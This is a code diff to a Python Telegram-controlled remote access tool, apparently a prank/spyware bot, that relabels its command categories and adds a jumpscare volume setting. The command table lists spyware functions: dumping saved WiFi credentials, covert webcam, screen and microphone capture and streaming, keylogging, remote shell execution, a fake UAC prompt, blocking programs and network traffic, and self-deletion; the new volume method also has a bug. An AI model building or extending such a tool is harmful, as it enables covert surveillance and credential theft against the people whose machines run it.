@@ -347,6 +347,7 @@ class PeppinoTelegram:
         self.has_admin = is_admin()
         self.logger = logger
         self.logger.bind(conflict_error, self.handle_conflict)
+        self.jumpscare_volume = 100
 
         # Need to add this one so someone who spams my bot won't spam me
         self.strangers : list[int] = []
@@ -409,159 +410,160 @@ class PeppinoTelegram:
         self.commands = [
 
             # 🏠 Main Menu & Navigation (no buttons here, just category)
-            Command("mainmenu", self.mainmenu, "Open the main menu.", "🏠 Menu", "🏠 Main Menu"),
-            Command("menu_system", self.menu_system, "Open System & Shutdown menu.", "🏠 Menu", "🛑 System & Shutdown"),
-            Command("menu_network", self.menu_network, "Open Network & Remote Access menu.", "🏠 Menu", "🌐 Network & Remote Access"),
-            Command("menu_camera", self.menu_camera, "Open Camera & Screen menu.", "🏠 Menu", "📸 Camera & Screen"),
-            Command("menu_audio", self.menu_audio, "Open Audio & Volume menu.", "🏠 Menu", "🔊 Audio & Volume"),
-            Command("menu_soundfx", self.menu_soundfx, "Open Sound Effects menu.", "🏠 Menu", "🎵 Sound Effects"),
-            Command("menu_pranks", self.menu_pranks, "Open Pranks & Visuals menu.", "🏠 Menu", "😈 Pranks & Visuals"),
-            Command("menu_control", self.menu_control, "Open System Control menu.", "🏠 Menu", "💻 System Control"),
-            Command("menu_input", self.menu_input, "Open Input / Device Control menu.", "🏠 Menu", "🎮 Input / Device Control"),
-            Command("menu_messaging", self.menu_messaging, "Open Messaging menu.", "🏠 Menu", "📋 Messaging"),
-            Command("menu_cantopen", self.menu_cantopen, "Open Can't Open List menu.", "🏠 Menu", "🔒 Can't Open List"),
-            Command("menu_keylogger", self.menu_keylogger, "Open Keylogger menu.", "🏠 Menu", "🧠 Keylogger"),
-            Command("menu_misc", self.menu_misc, "Open Misc menu.", "🏠 Menu", "🦑 Misc"),
-            Command("menu_mitm", self.menu_mitm, "Open MITM menu.", "🏠 Menu", "🕵️‍♂️ MITM"),
-            Command("menu_plugins", self.menu_plugins, "Open Plugins menu.", "🏠 Menu", "🔌 Your Plugins"),
-            Command("menu_utilities", self.menu_utilities, "Open Utilities Menu", "🏠 Menu", "🔧 Utility"),
-            Command("menu_duckyscript", self.menu_ducky, "Opens ducky quick keys.", "🏠 Menu", "🦆 DuckyScript"),
+            Command("mainmenu", self.mainmenu, "Open the main menu.", "menu", "🏠 Main Menu"),
+            Command("menu_system", self.menu_system, "Open System & Shutdown menu.", "menu", "🛑 System & Shutdown"),
+            Command("menu_network", self.menu_network, "Open Network & Remote Access menu.", "menu", "🌐 Network & Remote Access"),
+            Command("menu_camera", self.menu_camera, "Open Camera & Screen menu.", "menu", "📸 Camera & Screen"),
+            Command("menu_audio", self.menu_audio, "Open Audio & Volume menu.", "menu", "🔊 Audio & Volume"),
+            Command("menu_soundfx", self.menu_soundfx, "Open Sound Effects menu.", "menu", "🎵 Sound Effects"),
+            Command("menu_pranks", self.menu_pranks, "Open Pranks & Visuals menu.", "menu", "😈 Pranks & Visuals"),
+            Command("menu_control", self.menu_control, "Open System Control menu.", "menu", "💻 System Control"),
+            Command("menu_input", self.menu_input, "Open Input / Device Control menu.", "menu", "🎮 Input / Device Control"),
+            Command("menu_messaging", self.menu_messaging, "Open Messaging menu.", "menu", "📋 Messaging"),
+            Command("menu_cantopen", self.menu_cantopen, "Open Can't Open List menu.", "menu", "🔒 Can't Open List"),
+            Command("menu_keylogger", self.menu_keylogger, "Open Keylogger menu.", "menu", "🧠 Keylogger"),
+            Command("menu_misc", self.menu_misc, "Open Misc menu.", "menu", "🦑 Misc"),
+            Command("menu_mitm", self.menu_mitm, "Open MITM menu.", "menu", "🕵️‍♂️ MITM"),
+            Command("menu_plugins", self.menu_plugins, "Open Plugins menu.", "menu", "🔌 Your Plugins"),
+            Command("menu_utilities", self.menu_utilities, "Open Utilitiemenu", "🏠 Menu", "🔧 Utility"),
+            Command("menu_duckyscript", self.menu_ducky, "Opens ducky quick keys.", "menu", "🦆 DuckyScript"),
             
             # 🛑 System & Shutdown
-            Command("shutdown", self.shutdown, "Power off PC.", "🛑 System", "🛑 Shutdown"),
-            Command("fakeshutdown", self.fake_shutdown, "Fake shutdown sequence.", "🛑 System", "🎭 Fakeshutdown"),
-            Command("fakeuac", self.fakeuac, "Fake UAC prompt.", "🛑 System", "Fake UAC"),
-            Command("selfdestruction", self.selfdestruction, "Remove program permanently.", "🛑 System", "💣 Selfdestruction"),
-            Command("clear", self.clear, "Clean windows, webcam, temp files.", "🛑 System", "🧹 Clear"),
-            Command("altf4", self.altf4, "Send Alt+F4.", "🛑 System", "⌨️ Altf4"),
+            Command("shutdown", self.shutdown, "Power off PC.", "system", "🛑 Shutdown"),
+            Command("fakeshutdown", self.fake_shutdown, "Fake shutdown sequence.", "system", "🎭 Fakeshutdown"),
+            Command("fakeuac", self.fakeuac, "Fake UAC prompt.", "system", "Fake UAC"),
+            Command("selfdestruction", self.selfdestruction, "Remove program permanently.", "system", "💣 Selfdestruction"),
+            Command("clear", self.clear, "Clean windows, webcam, temp files.", "system", "🧹 Clear"),
+            Command("altf4", self.altf4, "Send Alt+F4.", "system", "⌨️ Altf4"),
 
             # 🌐 Network & Remote Access
-            Command("wifiinfo", self.wifiinfo, "Show saved WiFi credentials.", "🌐 Network", "📶 Wifiinfo"),
-            Command("getip", self.getip, "Get public IP and location.", "🌐 Network", "🌐 Get IP"),
-            Command("urltoast", notify_toast, "Show Windows toast with URL.", "🌐 Network", "🔗 URL Toast"),
-            Command("block_port", self.block_port, "Block a specific TCP/UDP port.", "🌐 Network", "🚫 Block Port"),
-            Command("block_http", self.block_http, "Block all outbound HTTP traffic (port 80).", "🌐 Network", "🚫 Block HTTP"),
-            Command("block_https", self.block_https, "Block all outbound HTTPS traffic (port 443).", "🌐 Network", "🚫 Block HTTPS"),
+            Command("wifiinfo", self.wifiinfo, "Show saved WiFi credentials.", "network", "📶 Wifiinfo"),
+            Command("getip", self.getip, "Get public IP and location.", "network", "🌐 Get IP"),
+            Command("urltoast", notify_toast, "Show Windows toast with URL.", "network", "🔗 URL Toast"),
+            Command("block_port", self.block_port, "Block a specific TCP/UDP port.", "network", "🚫 Block Port"),
+            Command("block_http", self.block_http, "Block all outbound HTTP traffic (port 80).", "network", "🚫 Block HTTP"),
+            Command("block_https", self.block_https, "Block all outbound HTTPS traffic (port 443).", "network", "🚫 Block HTTPS"),
 
             # 📸 Camera & Screen
-            Command("selfie", self.selfie, "Take webcam photo.", "📸 Camera", "🤳 Webcam Snapshot"),
-            Command("screenshot", self.screenshot, "Capture screen.", "📸 Camera", "🖼️ Take Screenshot"),
-            Command("selfieandscreenshot", self.screenshotandselfie, "Caputre screen and webcam in the same image", "📸 Camera", "🤳🖼️ Take Screenshot&Webcam"),
-            Command("fullclip", self.record_webcam_and_screen, "Record webcam and screen.", "📸 Camera", "🎞️ Record Full Clip"),
-            Command("webcamclip", self.record_webcam, "Record webcam only.", "📸 Camera", "🎥 Record Webcam"),
-            Command("screenclip", self.record_screen, "Record screen only.", "📸 Camera", "🖥️ Record Screen"),
-            Command("recordjum", self.record_jumpscare_reaction, "Record jumpscare reaction.", "📸 Camera", "🎙️ Record Audio Jump"),
-            Command("waitforface", self.waitforface, "Capture photo when face detected.", "📸 Camera", "⏳ Waiting for Face"),
-            Command("checkforface", self.checkforface, "Check for face presence.", "📸 Camera", "🔍 Check for Face"),
-            Command("displaymode", self.display_mode, "Change display mode.", "📸 Camera", "🖼️ Display Options"),
-            Command("webcamstreamstart", self.start_webcam_tunnel, "Start webcam stream.", "📸 Camera", "📹🟢 Start Webcam Stream"),
-            Command("screenstreamstart", self.start_screen_tunnel, "Start screen stream.", "📸 Camera", "🖥️🟢 Start Screen Stream"),
-            Command("webcamstreamstop", self.stop_webcam_tunnel, "Stop webcam stream.", "📸 Camera", "📹🔴 Stop Webcam Stream"),
-            Command("screenstreamstop", self.stop_screen_tunnel, "Stop screen stream.", "📸 Camera", "🖥️🔴 Stop Screen Stream"),
-            Command("webcamandscreenstreamstart", self.start_webcam_and_screen_tunnel, "Start webcam and screen streams.", "📸 Camera", "📹🖥️🟢 Start Both Streams"),
-            Command("webcamandscreenstreamstop", self.stop_webcam_and_screen_tunnel, "Stop webcam and screen streams.", "📸 Camera", "📹🖥️🔴 Stop Both Streams"),
-            Command("stop_all_tunnels", self.stop_all_tunnels, "Stop all active streams.", "📸 Camera", "❌🔴 Stop All Streams"),
+            Command("selfie", self.selfie, "Take webcam photo.", "camera", "🤳 Webcam Snapshot"),
+            Command("screenshot", self.screenshot, "Capture screen.", "camera", "🖼️ Take Screenshot"),
+            Command("selfieandscreenshot", self.screenshotandselfie, "Caputre screen and webcam in the same image", "camera", "🤳🖼️ Take Screenshot&Webcam"),
+            Command("fullclip", self.record_webcam_and_screen, "Record webcam and screen.", "camera", "🎞️ Record Full Clip"),
+            Command("webcamclip", self.record_webcam, "Record webcam only.", "camera", "🎥 Record Webcam"),
+            Command("screenclip", self.record_screen, "Record screen only.", "camera", "🖥️ Record Screen"),
+            Command("recordjum", self.record_jumpscare_reaction, "Record jumpscare reaction.", "camera", "🎙️ Record Audio Jump"),
+            Command("waitforface", self.waitforface, "Capture photo when face detected.", "camera", "⏳ Waiting for Face"),
+            Command("checkforface", self.checkforface, "Check for face presence.", "camera", "🔍 Check for Face"),
+            Command("displaymode", self.display_mode, "Change display mode.", "camera", "🖼️ Display Options"),
+            Command("webcamstreamstart", self.start_webcam_tunnel, "Start webcam stream.", "camera", "📹🟢 Start Webcam Stream"),
+            Command("screenstreamstart", self.start_screen_tunnel, "Start screen stream.", "camera", "🖥️🟢 Start Screen Stream"),
+            Command("webcamstreamstop", self.stop_webcam_tunnel, "Stop webcam stream.", "camera", "📹🔴 Stop Webcam Stream"),
+            Command("screenstreamstop", self.stop_screen_tunnel, "Stop screen stream.", "camera", "🖥️🔴 Stop Screen Stream"),
+            Command("webcamandscreenstreamstart", self.start_webcam_and_screen_tunnel, "Start webcam and screen streams.", "camera", "📹🖥️🟢 Start Both Streams"),
+            Command("webcamandscreenstreamstop", self.stop_webcam_and_screen_tunnel, "Stop webcam and screen streams.", "camera", "📹🖥️🔴 Stop Both Streams"),
+            Command("stop_all_tunnels", self.stop_all_tunnels, "Stop all active streams.", "camera", "❌🔴 Stop All Streams"),
             Command("camerawallpaper", self.setCameraAsWallpaper, "Set webcam as wallpaper.", "📸 Camera", "📷 Camera Wallpaper"),
-            Command("setvideowallpaper", self.setvideowallpaper, "Set video as wallpaper.", "📸 Camera", "🎞️ Set Video Wallpaper"),
+            Command("setvideowallpaper", self.setvideowallpaper, "Set video as wallpaper.", "camera", "🎞️ Set Video Wallpaper"),
 
             # 🔊 Audio & Volume
-            Command("microphone", self.send_record_audio, "Record microphone audio.", "🔊 Audio", "🎙️ Microphone"),
-            Command("mutevolume", lambda: self.audio_mixer.mute(), "Mute system volume.", "🔊 Audio", "🔇 Mute Volume"),
-            Command("fullvolume", lambda: self.audio_mixer.full(), "Set volume to maximum.", "🔊 Audio", "🔊 Full Volume"),
-            Command("setvolume", self.audio_mixer.setVolumePercentage, "Set volume percentage.", "🔊 Audio", "🎚️ Set Volume"),
-            Command("getvolume", lambda: self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"), "Get current volume.", "🔊 Audio", "📊 Get Volume"),
-            Command("mixermenu", self.mixer_menu, "Open audio mixer menu.", "🔊 Audio", "🎛️ Mixer Menu"),
-            Command("playfromurl", play_from_url, "Play audio from URL.", "🔊 Audio", "🔗 Play from URL"),
-            Command("playrandomnoise", self.playrandomnoise, "Play static/interference noise.", "🔊 Audio", "📡 Play Noise"),
-            Command("disturbed_overlay_and_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay with audio.", "🔊 Audio", "🌀📻 Video&Sound Disturbance"),
+            Command("microphone", self.send_record_audio, "Record microphone audio.", "audio", "🎙️ Microphone"),
+            Command("mutevolume", lambda: self.audio_mixer.mute(), "Mute system volume.", "audio", "🔇 Mute Volume"),
+            Command("fullvolume", lambda: self.audio_mixer.full(), "Set volume to maximum.", "audio", "🔊 Full Volume"),
+            Command("setvolume", self.audio_mixer.setVolumePercentage, "Set volume percentage.", "audio", "🎚️ Set Volume"),
+            Command("getvolume", lambda: self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"), "Get current volume.", "audio", "📊 Get Volume"),
+            Command("mixermenu", self.mixer_menu, "Open audio mixer menu.", "audio", "🎛️ Mixer Menu"),
+            Command("playfromurl", play_from_url, "Play audio from URL.", "audio", "🔗 Play from URL"),
+            Command("playrandomnoise", self.playrandomnoise, "Play static/interference noise.", "audio", "📡 Play Noise"),
+            Command("disturbed_overlay_and_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay with audio.", "audio", "🌀📻 Video&Sound Disturbance"),
 
             # 🎵 Sound Effects
-            Command("pss", self.pss, "Play 'psst' sound.", "🎵 Sound FX", "👂 Psst"),
-            Command("psst", self.pss, "Alias for pss.", "🎵 Sound FX", "👂 Psst"),
-            Command("breath", self.breath, "Play breathing sound.", "🎵 Sound FX", "🌬️ Breath"),
-            Command("fart", self.fart, "Play fart sound.", "🎵 Sound FX", "💨 Fart"),
-            Command("knockknock", self.knockknock, "Play knocking sound.", "🎵 Sound FX", "🚪 Knock"),
-            Command("tralalerotralala", lambda: self.__play_loaded_sound("tralarero-tralala", volume=8), "Play Italian brainrot sound.", "🎵 Sound FX", "🎶 Tralalero"),
-            Command("scream11s", self.scream_11s, "Play 11-second scream.", "🎵 Sound FX", "😱 11s Scream"),
-            Command("scream15s", self.scream_15s, "Play 15-second scream.", "🎵 Sound FX", "😱 15s Scream"),
-            Command("behindyou_kid", self.behindyou_kid, "Play 'Behind you' child voice.", "🎵 Sound FX", "👶 Behind you (kid)"),
-            Command("behindyou_whisper", self.behindyou_whisper, "Play 'Behind you' whisper.", "🎵 Sound FX", "👻 Behind you (whisper)"),
+            Command("pss", self.pss, "Play 'psst' sound.", "sound_fx", "👂 Psst"),
+            Command("psst", self.pss, "Alias for pss.", "sound_fx", "👂 Psst"),
+            Command("breath", self.breath, "Play breathing sound.", "sound_fx", "🌬️ Breath"),
+            Command("fart", self.fart, "Play fart sound.", "sound_fx", "💨 Fart"),
+            Command("knockknock", self.knockknock, "Play knocking sound.", "sound_fx", "🚪 Knock"),
+            Command("tralalerotralala", lambda: self.__play_loaded_sound("tralarero-tralala", volume=8), "Play Italian brainrot sound.", "sound_fx", "🎶 Tralalero"),
+            Command("scream11s", self.scream_11s, "Play 11-second scream.", "sound_fx", "😱 11s Scream"),
+            Command("scream15s", self.scream_15s, "Play 15-second scream.", "sound_fx", "😱 15s Scream"),
+            Command("behindyou_kid", self.behindyou_kid, "Play 'Behind you' child voice.", "sound_fx", "👶 Behind you (kid)"),
+            Command("behindyou_whisper", self.behindyou_whisper, "Play 'Behind you' whisper.", "sound_fx", "👻 Behind you (whisper)"),
 
             # 😈 Pranks & Visuals
-            Command("jumpscare", self.jumpscare, "Trigger random jumpscare.", "😈 Pranks", "👻 Jumpscare"),
-            Command("jumpscarenoaudio", self.jumpscarenoaudio, "Jumpscare without sound.", "😈 Pranks", "😶‍🌫️ Jumpscare noaudio"),
-            Command("fakebsod", self.fake_bsod, "Show fake Blue Screen of Death.", "😈 Pranks", "💀 Fake BSOD"),
-            Command("invertedscreen", self.inverted_screen, "Invert screen colors.", "😈 Pranks", "🔄 Inverted Screen"),
-            Command("showqr",self.show_qr_overlay,"Display QR code overlay with custom text. Args: url [text] [duration]","😈 Pranks","QR Overlay"),
-            Command("distortedscreen", self.distorted_screen, "Distort screen output.", "😈 Pranks", "🌀 Distorted Screen"),
-            Command("messagebox", self.message_box, "Show custom message box.", "😈 Pranks", "💬 Message Box"),
-            Command("messagespam", self.spam_windows, "Spam message boxes.", "😈 Pranks", "📨 Message Spam"),
-            Command("camerawallpaper", self.setCameraAsWallpaper, "Webcam as wallpaper.", "😈 Pranks", "📷 Camera Wallpaper"),
-            Command("setvideowallpaper", self.setvideowallpaper, "Video as wallpaper.", "😈 Pranks", "🎞️ Set Video Wallpaper"),
-            Command("hdmi_drowning_effect", self.wrapper_for_hdmi_overlay, "Noise overlay effect.", "😈 Pranks", "🖥️🌀 Video Signal Drowning Effect"),
-            Command("disturbed_overlay_and_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay + audio.", "😈 Pranks", "🌀📻 Video&Sound Disturbance"),
-            Command("whisper_overlay", self.whisper_overlay, "Display creepy whisper overlay.", "😈 Pranks", "👻 Red Text Overlay"),
+            Command("jumpscare", self.jumpscare, "Trigger random jumpscare.", "parnks", "👻 Jumpscare"),
+            Command("jumpscarenoaudio", self.jumpscarenoaudio, "Jumpscare without sound.", "parnks", "😶‍🌫️ Jumpscare noaudio"),
+            Command("fakebsod", self.fake_bsod, "Show fake Blue Screen of Death.", "parnks", "💀 Fake BSOD"),
+            Command("invertedscreen", self.inverted_screen, "Invert screen colors.", "parnks", "🔄 Inverted Screen"),
+            Command("showqr",self.show_qr_overlay,"Display QR code overlay with custom text. Args: url [text] [duration]","parnks","QR Overlay"),
+            Command("distortedscreen", self.distorted_screen, "Distort screen output.", "parnks", "🌀 Distorted Screen"),
+            Command("messagebox", self.message_box, "Show custom message box.", "parnks", "💬 Message Box"),
+            Command("messagespam", self.spam_windows, "Spam message boxes.", "parnks", "📨 Message Spam"),
+            Command("camerawallpaper", self.setCameraAsWallpaper, "Webcam as wallpaper.", "parnks", "📷 Camera Wallpaper"),
+            Command("setvideowallpaper", self.setvideowallpaper, "Video as wallpaper.", "parnks", "🎞️ Set Video Wallpaper"),
+            Command("hdmi_drowning_effect", self.wrapper_for_hdmi_overlay, "Noise overlay effect.", "parnks", "🖥️🌀 Video Signal Drowning Effect"),
+            Command("disturbed_overlay_and_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay + audio.", "parnks", "🌀📻 Video&Sound Disturbance"),
+            Command("whisper_overlay", self.whisper_overlay, "Display creepy whisper overlay.", "parnks", "👻 Red Text Overlay"),
+            Command("setJumpVol", self.setJumpscareVolume, "Set jumpscare's volume.","parnks" , "Set Jumpscare Volume"),
 
             # 🦑 Misc & Memes
-            Command("plankton", self.plankton, "Plankton jumpscare.", "🦑 Misc", "🦑 Plankton"),
-            Command("planktonnoaudio", self.planktonnoaudio, "Plankton without audio.", "🦑 Misc", "🔇 Plankton no audio"),
-            Command("johnpork", self.johnpork, "John Pork jumpscare.", "🦑 Misc", "🐷 Johnpork"),
-            Command("johnporknoaudio", self.johnporknoaudio, "John Pork without audio.", "🦑 Misc", "🔕 Johnpork no audio"),
-            Command("gabinetti", self.gabinetti, "Play Gabinetti meme.", "🦑 Misc", "🛋️ Gabinetti"),
-            Command("duckyscript", lambda *args: toducky(" ".join(args), execute=True), "Execute DuckyScript.", "🦑 Misc", "⌨️ Duckyscript"),
-            Command("duckyhelp", lambda: self.bsend(self.duckyhelp), "Show DuckyScript help.", "🦑 Misc", "❓ Duckyhelp"),
-            Command("browser", browseropen, "Open URL in browser.", "🦑 Misc", "🌐 Browser"),
+            Command("plankton", self.plankton, "Plankton jumpscare.", "misc", "🦑 Plankton"),
+            Command("planktonnoaudio", self.planktonnoaudio, "Plankton without audio.", "misc", "🔇 Plankton no audio"),
+            Command("johnpork", self.johnpork, "John Pork jumpscare.", "misc", "🐷 Johnpork"),
+            Command("johnporknoaudio", self.johnporknoaudio, "John Pork without audio.", "misc", "🔕 Johnpork no audio"),
+            Command("gabinetti", self.gabinetti, "Play Gabinetti meme.", "misc", "🛋️ Gabinetti"),
+            Command("duckyscript", lambda *args: toducky(" ".join(args), execute=True), "Execute DuckyScript.", "misc", "⌨️ Duckyscript"),
+            Command("duckyhelp", lambda: self.bsend(self.duckyhelp), "Show DuckyScript help.", "misc", "❓ Duckyhelp"),
+            Command("browser", browseropen, "Open URL in browser.", "misc", "🌐 Browser"),
 
             # 💻 System Control
-            Command("disk_info", self.get_disk_info, "Sends infos about the connected drives.", "💻 System Control", "💿 List Drives"),
-            Command("execute_withoutput", lambda x: self.bsend(self.execute(x, return_output=True, shell=True)), "Execute system command.", "💻 System Control", "⚙️ Execute"),
+            Command("disk_info", self.get_disk_info, "Sends infos about the connected drives.", "system_control", "💿 List Drives"),
+            Command("execute_withoutput", lambda x: self.bsend(self.execute(x, return_output=True, shell=True)), "Execute system command.", "system_control", "⚙️ Execute"),
             Command("execute", self.execute, "null", "null", "null"),
-            Command("processkiller", self.process_killer, "Kill process from list.", "💻 System Control", "💀 Process Killer"),
-            Command("terminateprocess", terminate_process_by_name, "Terminate process by name.", "💻 System Control", "🛑 Terminate Process"),
-            Command("procmonadd", self.processmonitoradd, "Add process to monitor.", "💻 System Control", "➕ Procmon Add"),
-            Command("procmonrem", self.processmonitorrem, "Remove process from monitor.", "💻 System Control", "➖ Procmon Remove"),
-            Command("procmonmenu", self.processmonitormenushow, "Show process monitor menu.", "💻 System Control", "📊 Procmon Menu"),
-            Command("cmdsession", self.cmdsession, "Open interactive CMD session.", "💻 System Control", "</> CMDSession"),
+            Command("processkiller", self.process_killer, "Kill process from list.", "system_control", "💀 Process Killer"),
+            Command("terminateprocess", terminate_process_by_name, "Terminate process by name.", "system_control", "🛑 Terminate Process"),
+            Command("procmonadd", self.processmonitoradd, "Add process to monitor.", "system_control", "➕ Procmon Add"),
+            Command("procmonrem", self.processmonitorrem, "Remove process from monitor.", "system_control", "➖ Procmon Remove"),
+            Command("procmonmenu", self.processmonitormenushow, "Show process monitor menu.", "system_control", "📊 Procmon Menu"),
+            Command("cmdsession", self.cmdsession, "Open interactive CMD session.", "system_control", "</> CMDSession"),
 
             # 🎮 Input / Device Control
-            Command("randomkeyboard", self.randomkeyboard, "Send random keyboard input.", "🎮 Input", "🎹 Randomkeyboard"),
-            Command("capslock", lambda: toducky("CAPSLOCK", execute=True), "Toggle Caps Lock.", "🎮 Input", "🔠 Capslock"),
-            Command("mouselock", self.mouselock, "Lock mouse position.", "🎮 Input", "🖱️ Mouselock"),
-            Command("mousecontroller", self.mousecontroller, "Open mouse control menu.", "🎮 Input", "🎮 Mousecontroller"),
-            Command("setMouseJump", self.setMouseJump, "Set mouse jump distance.", "🎮 Input", "🎯 Set Mouse Jump"),
-            Command("mouser", self.mouser, "Move mouse right.", "🎮 Input", "➡️ Move Right"),
-            Command("mousel", self.mousel, "Move mouse left.", "🎮 Input", "⬅️ Move Left"),
-            Command("mouseu", self.mouseu, "Move mouse up.", "🎮 Input", "⬆️ Move Up"),
-            Command("moused", self.moused, "Move mouse down.", "🎮 Input", "⬇️ Move Down"),
-            Command("leftclick", self.leftclick, "Left mouse click.", "🎮 Input", "🖱️ Left Click"),
-            Command("rightclick", self.rightclick, "Right mouse click.", "🎮 Input", "🖱️ Right Click"),
+            Command("randomkeyboard", self.randomkeyboard, "Send random keyboard input.", "input", "🎹 Randomkeyboard"),
+            Command("capslock", lambda: toducky("CAPSLOCK", execute=True), "Toggle Caps Lock.", "input", "🔠 Capslock"),
+            Command("mouselock", self.mouselock, "Lock mouse position.", "input", "🖱️ Mouselock"),
+            Command("mousecontroller", self.mousecontroller, "Open mouse control menu.", "input", "🎮 Mousecontroller"),
+            Command("setMouseJump", self.setMouseJump, "Set mouse jump distance.", "input", "🎯 Set Mouse Jump"),
+            Command("mouser", self.mouser, "Move mouse right.", "input", "➡️ Move Right"),
+            Command("mousel", self.mousel, "Move mouse left.", "input", "⬅️ Move Left"),
+            Command("mouseu", self.mouseu, "Move mouse up.", "input", "⬆️ Move Up"),
+            Command("moused", self.moused, "Move mouse down.", "input", "⬇️ Move Down"),
+            Command("leftclick", self.leftclick, "Left mouse click.", "input", "🖱️ Left Click"),
+            Command("rightclick", self.rightclick, "Right mouse click.", "input", "🖱️ Right Click"),
 
             # 📋 Messaging
-            Command("bsend", self.bsend, "Send text message.", "📋 Messaging", "📤 Bsend"),
-            Command("id", lambda: self.bsend(f"CHAT_ID: {self.owner_id}"), "Send chat ID.", "📋 Messaging", "🆔 Id"),
-            Command("deletemessages", self.deleteallmessages, "Delete recent messages.", "📋 Messaging", "❌ Deletemessages"),
-            Command("deleteallmessages", self.deleteallmessages, "Delete all messages.", "📋 Messaging", "🗑️ Deleteallmessages"),
+            Command("bsend", self.bsend, "Send text message.", "messaging", "📤 Bsend"),
+            Command("id", lambda: self.bsend(f"CHAT_ID: {self.owner_id}"), "Send chat ID.", "messaging", "🆔 Id"),
+            Command("deletemessages", self.deleteallmessages, "Delete recent messages.", "messaging", "❌ Deletemessages"),
+            Command("deleteallmessages", self.deleteallmessages, "Delete all messages.", "messaging", "🗑️ Deleteallmessages"),
 
             # 🔒 Can't Open List
-            Command("cantopenadd", self.cantopen, "Block process execution.", "🔒 Can't Open", "🚫 Cantopenadd"),
-            Command("cantopenremove", self.removefromcantopen, "Unblock process execution.", "🔒 Can't Open", "❌ Cantopenremove"),
-            Command("cantopenmenu", self.cantopenmenu, "Show blocked processes.", "🔒 Can't Open", "📋 Cantopenmenu"),
+            Command("cantopenadd", self.cantopen, "Block process execution.", "cant_open", "🚫 Cantopenadd"),
+            Command("cantopenremove", self.removefromcantopen, "Unblock process execution.", "cant_open", "❌ Cantopenremove"),
+            Command("cantopenmenu", self.cantopenmenu, "Show blocked processes.", "cant_open", "📋 Cantopenmenu"),
 
             # 🧠 Keylogger
-            Command("keylogger", self.keylogger, "Log keystrokes to file.", "🧠 Keylogger", "⌨️ Keylogger"),
-            Command("livekeylogger", self.live_keylogger, "Live keystroke monitoring.", "🧠 Keylogger", "📡 Livekeylogger"),
+            Command("keylogger", self.keylogger, "Log keystrokes to file.", "keylogger", "⌨️ Keylogger"),
+            Command("livekeylogger", self.live_keylogger, "Live keystroke monitoring.", "keylogger", "📡 Livekeylogger"),
 
             # 🕵️‍♂️ MITM
-            Command("block_port", self.block_port, "Blocks traffic on a specific port.", "🕵️‍♂️ MITM", "Block Port"),
-            Command("block_http", self.block_http, "Blocks traffic http", "🕵️‍♂️ MITM", "Block HTTP"),
-            Command("block_https", self.block_https, "Blocks traffic on a specific port.", "🕵️‍♂️ MITM", "Block HTTPS"),
+            Command("block_port", self.block_port, "Blocks traffic on a specific port.", "️mitm", "Block Port"),
+            Command("block_http", self.block_http, "Blocks traffic http", "mitm", "Block HTTP"),
+            Command("block_https", self.block_https, "Blocks traffic on a specific port.", "mitm", "Block HTTPS"),
 
             # 🔧 Utilities & Testing
-            Command("get_logs", self.get_logs, "Gets the program logs ins a file", "🔧 Utility", "📄 Get Logs"),
-            Command("stop", self.stop, "Stop current operation.", "🔧 Utility", "🛑 Stop"),
-            Command("test", self.test, "Run test routine.", "🔧 Utility", "🧪 Test"),
-            Command("help", self.show_help, "Show help menu.", "🔧 Utility", "❓ Help"),
-            Command("nothing", lambda: ..., "No-op command.", "🔧 Utility", "Nothing"),
+            Command("get_logs", self.get_logs, "Gets the program logs ins a file", "utility", "📄 Get Logs"),
+            Command("stop", self.stop, "Stop current operation.", "utility", "🛑 Stop"),
+            Command("test", self.test, "Run test routine.", "utility", "🧪 Test"),
+            Command("help", self.show_help, "Show help menu.", "utility", "❓ Help"),
+            Command("nothing", lambda: ..., "No-op command.", "utility", "Nothing"),
         ]
 
         self.help = generate_help(self.commands)
@@ -934,7 +936,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.jumpscare("plankton_meme", "gabinetti")
 
     def handle_conflict(self) -> None:
-        self.stop()
+        self.stop(confirm=False)
 
     def handle(self, msg: str) -> None:
         print(f"Handling message type: {glance(msg)[0]}")
@@ -1012,10 +1014,10 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print("Playing John Pork meme without audio")
         self.johnpork(False)
 
-    def jumpscare(self, image=None, audio=None, playaudio=True, showimage=True, setvolume: int=100) -> None:
+    def jumpscare(self, image=None, audio=None, playaudio=True, showimage=True, setvolume: int|None = None) -> None:
         print(f"Triggering jumpscare, image={image}, audio={audio}")
         old_volume = self.audio_mixer.getVolumePercentage()
-        self.audio_mixer.setVolumePercentage(setvolume)
+        self.audio_mixer.setVolumePercentage(self.jumpscare_volume if not setvolume else setvolume)
         if image is None:
             image = self.images[choice(list(self.nomemes))]
         else:
@@ -1265,6 +1267,18 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         else:
             self.bsend("Mouse jump must be numeric.")
 
+    def setJumpscareVolume(self, volume: int= None) -> None:
+        print(f"Setting jumpscare's volume to: {volume}")
+        if volume is None:
+            jmp = self.send_prompt("Set jumpscare's volume: ")
+        if jmp.isnumeric():
+            jmp = int(jmp)
+            if jmp < 0:
+                self.bsend("Volume must be a positive number.")
+            self.jumpscare_volume = min(jmp, 100)
+        else:
+            self.bsend("Jumpscare's volume must be numeric.")
+
     def moused(self) -> None:
         print("Moving mouse down")
         pos = pg.position()
@@ -1369,63 +1383,64 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def menu_system(self):
         print("Opening system menu")
-        return self.generate_category_menu("🛑 System", "🛑 System & Shutdown")
+        return self.generate_category_menu("system", "🛑 System & Shutdown")
 
     def menu_utilities(self):
         print("Opening utilities menu")
-        return self.generate_category_menu("🔧 Utility", "🔧 Utility")
+        return self.generate_category_menu("utility", "🔧 Utility")
 
     def menu_network(self):
         print("Opening network menu")
-        return self.generate_category_menu("🌐 Network", "🌐 Network & Remote Access")
+        return self.generate_category_menu("network", "🌐 Network & Remote Access")
 
     def menu_camera(self):
         print("Opening camera menu")
-        return self.generate_category_menu("📸 Camera", "📸 Camera & Screen")
+        return self.generate_category_menu("camera", "📸 Camera & Screen")
 
     def menu_audio(self):
         print("Opening audio menu")
-        return self.generate_category_menu("🔊 Audio", "🔊 Audio & Volume")
